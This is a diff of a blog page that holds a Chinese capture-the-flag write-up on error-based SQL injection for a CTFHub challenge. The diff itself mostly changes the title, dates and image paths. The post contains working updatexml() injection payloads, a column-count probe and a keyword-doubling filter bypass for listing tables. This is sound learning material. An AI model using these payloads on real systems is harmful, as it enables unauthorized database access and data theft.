@@ -152,41 +152,47 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-CTFHUB-SQL注入-2小计" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-CTFHUB-SQL注入-2" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/14/CTFHUB-SQL%E6%B3%A8%E5%85%A5-2%E5%B0%8F%E8%AE%A1/">CTFHUB-SQL注入-2小计</a>
+      <a class="article-title" href="/2022/03/15/CTFHUB-SQL%E6%B3%A8%E5%85%A5-2/">CTFHUB-SQL注入-2</a>
     </h1>
   
 
         
-        <a href="/2022/03/14/CTFHUB-SQL%E6%B3%A8%E5%85%A5-2%E5%B0%8F%E8%AE%A1/" class="archive-article-date">
-  	<time datetime="2022-03-14T15:58:04.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-14</time>
+        <a href="/2022/03/15/CTFHUB-SQL%E6%B3%A8%E5%85%A5-2/" class="archive-article-date">
+  	<time datetime="2022-03-14T16:35:30.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-03-15</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="函数解析"><a href="#函数解析" class="headerlink" title="函数解析"></a>函数解析</h3><p><code>updatexml()</code> 通过这个函数 可以让mysql产生报错信息 但是 还是会执行这个查询语句 查询的结果会跟报错信息一起返回</p>
+        <h1 id="CTFHUB-SQL注入-2思维小计"><a href="#CTFHUB-SQL注入-2思维小计" class="headerlink" title="CTFHUB-SQL注入-2思维小计"></a>CTFHUB-SQL注入-2思维小计</h1><h3 id="函数解析"><a href="#函数解析" class="headerlink" title="函数解析"></a>函数解析</h3><p><code>updatexml()</code> 通过这个函数 可以让mysql产生报错信息 但是 还是会执行这个查询语句 查询的结果会跟报错信息一起返回</p>
 <p><code>0x7e</code> 是~的十六进制，用于显示完整信息，避免被吃</p>
 <h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><p>1.F12查看页面注释，有提示，在url中加入<code>?tips=1</code>出现报错信息</p>
 <p>2.burp抓包尝试在<code>name</code>后加上<code>&#39;</code>,会出现报错</p>
-<p><img src="/.com//blog\xiangmu\home\source_posts\CTFHUB-SQL注入-2小计\image-20220314112201847.png" alt="logo"></p>
+<img src="/.com//03/15/CTFHUB-SQL%E6%B3%A8%E5%85%A5-2/image-20220314112201847.png" class title="image-20220314112201847">
+
 <p>3.order by 4会报错，确定只有三列，这是一个报错注入</p>
-<p><img src="/.com//blog\xiangmu\home\source_posts\CTFHUB-SQL注入-2小计\image-20220314112521952.png" alt="logo"></p>
+<img src="/.com//03/15/CTFHUB-SQL%E6%B3%A8%E5%85%A5-2/image-20220314112521952.png" class title="image-20220314112521952">
+
 <p>4.用updatexml函数进行报错返回值</p>
-<p><img src="/.com//blog\xiangmu\home\source_posts\CTFHUB-SQL注入-2小计D:\blog\xiangmu\home\source_posts\CTFHUB-SQL注入-2小计\image-20220314115455054.png" alt="logo"></p>
+<img src="/.com//image-20220314115455054.png" alt="image-20220314115455054" style="zoom:67%;">
+
 <p>构建语句发现只返回了一个~</p>
-<p><img src="/.com//blog\xiangmu\home\source_posts\CTFHUB-SQL注入-2小计\image-20220314120622082.png" alt="logo"></p>
+<img src="/.com//03/15/CTFHUB-SQL%E6%B3%A8%E5%85%A5-2/image-20220314120622082.png" class title="image-20220314120622082">
+
 <p>发现中间这个值才会被返回</p>
-<p><img src="/.com//blog\xiangmu\home\source_posts\CTFHUB-SQL注入-2小计\image-20220314120731153.png" alt="logo"></p>
+<img src="/.com//03/15/CTFHUB-SQL%E6%B3%A8%E5%85%A5-2/image-20220314120731153.png" class title="image-20220314120731153">
+
 <p>于是构造函数 <code>123&#39; and updatexml(1,concat(0x7e,(select 1)),1)#</code></p>
-<p><img src="/.com//blog\xiangmu\home\source_posts\CTFHUB-SQL注入-2小计\image-20220314112836216.png" alt="logo"></p>
+<img src="/.com//03/15/CTFHUB-SQL%E6%B3%A8%E5%85%A5-2/image-20220314112836216.png" class title="image-20220314112836216">
+
 <p>查出库名为note <code>123’ and updatexml(1,concat(0x7e,(select database())),3)#</code></p>
 <p>构造语句</p>
 <p><code>name=123&#39;and updatexml(1,concat(0x7e,(selselectect(group_concat(table_name))from information_schema.tables where table_schema=’note‘)),1)#&amp;pass=xxxx</code></p>
@@ -200,22 +206,11 @@
     <div class="article-info article-info-index">
       
       
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2"><meta name="referrer" content="no-referrer" /></a>
-        		</li>
-      		
-		</ul>
-	</div>
-
       
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2022/03/14/CTFHUB-SQL%E6%B3%A8%E5%85%A5-2%E5%B0%8F%E8%AE%A1/">展开全文 >></a>
+          <a class="article-more-a" href="/2022/03/15/CTFHUB-SQL%E6%B3%A8%E5%85%A5-2/">展开全文 >></a>
         </p>
       
 
@@ -404,10 +399,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
             <input type="checkbox" q-on="click:toggleTag(e)" q-attr="checked:showTags">
           </label>
           <ul class="article-tag-list" q-show="showTags">
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2"><meta name="referrer" content="no-referrer" /></a>
-              </li>
             
             <div class="clearfix"></div>
           </ul>
